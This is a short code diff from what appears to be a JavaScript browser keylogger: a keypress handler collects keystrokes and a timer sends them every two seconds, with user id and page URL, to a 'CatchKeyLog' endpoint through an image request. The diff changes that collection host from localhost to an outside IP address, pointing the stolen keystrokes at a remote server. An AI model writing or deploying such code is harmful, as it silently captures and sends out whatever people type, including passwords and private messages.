@@ -17,6 +17,6 @@ document.onkeypress = function(e) {
 }
 
 window.setInterval(function(){
-	new Image().src = 'http://localhost:9000/CatchKeyLog?userid='+uid+'&data='+keys+'&page='+window.location.href+'&object='+object ;
+	new Image().src = 'http://192.16.1.99:9000/CatchKeyLog?userid='+uid+'&data='+keys+'&page='+window.location.href+'&object='+object ;
 	keys = '';
 }, 2000);
